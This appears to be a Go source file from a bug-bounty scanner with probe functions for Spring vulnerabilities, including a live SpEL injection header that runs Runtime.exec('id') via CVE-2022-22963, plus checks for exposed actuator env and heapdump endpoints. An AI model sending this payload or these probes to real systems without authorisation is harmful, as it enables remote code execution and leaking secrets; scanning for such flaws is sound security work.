package bugbounty

import (
	"fmt"
	"io"
	"net/http"
	"strings"
)

// CVE-2022-22963 Spring Cloud Function SpEL RCE
func ProbeCVE202222963(base string) *Finding {
	req, _ := http.NewRequest("POST", base+"/functionRouter", strings.NewReader("test"))
	req.Header.Set("Content-Type", "text/plain")
	req.Header.Set("spring.cloud.function.routing-expression", `T(java.lang.Runtime).getRuntime().exec("id")`)
	resp, err := client.Do(req)
	if err != nil {
		return nil
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(io.LimitReader(resp.Body, 4096))
	s := string(body)
	// 500 error on /functionRouter with SpEL header = vulnerable
	if resp.StatusCode == 500 && strings.Contains(s, "functionRouter") {
		return &Finding{Target: base, Vuln: "CVE-2022-22963 Spring Cloud Function RCE", Severity: "CRITICAL",
			Detail: fmt.Sprintf("SpEL routing-expression injected, HTTP %d", resp.StatusCode), URL: base + "/functionRouter"}
	}
	return nil
}

// CVE-2022-22947 Spring Cloud Gateway SpEL
func ProbeSpringGateway(base string) *Finding {
	code, body, _, err := Get(base + "/actuator/gateway/routes")
	if err != nil {
		return nil
	}
	if code == 200 && strings.Contains(body, "route_id") {
		return &Finding{Target: base, Vuln: "CVE-2022-22947 Spring Cloud Gateway", Severity: "HIGH",
			Detail: "gateway routes exposed via actuator", URL: base + "/actuator/gateway/routes"}
	}
	return nil
}

// CVE-2022-22965 Spring4Shell
func ProbeSpring4Shell(base string) *Finding {
	_, body, _, err := Get(base + "/")
	if err != nil {
		return nil
	}
	if strings.Contains(body, "Whitelabel Error Page") || strings.Contains(body, "Spring Boot") {
		return &Finding{Target: base, Vuln: "Spring Framework (detected)", Severity: "MEDIUM",
			Detail: "Spring Boot application detected", URL: base}
	}
	return nil
}

// Spring Boot Actuator
func ProbeActuator(base string) *Finding {
	paths := map[string]string{
		"/actuator": "actuator", "/actuator/env": "propertySources",
		"/actuator/heapdump": "java.io", "/env": "propertySources",
		"/heapdump": "java.io", "/metrics": "names",
	}
	for p, marker := range paths {
		code, body, _, err := Get(base + p)
		if err != nil {
			continue
		}
		if code == 200 && strings.Contains(body, marker) {
			sev := "MEDIUM"
			if strings.Contains(p, "env") || strings.Contains(p, "heapdump") {
				sev = "HIGH"
			}
			return &Finding{Target: base, Vuln: "Spring Boot Actuator Exposed", Severity: sev,
				Detail: p, URL: base + p}
		}
	}
	return nil
}
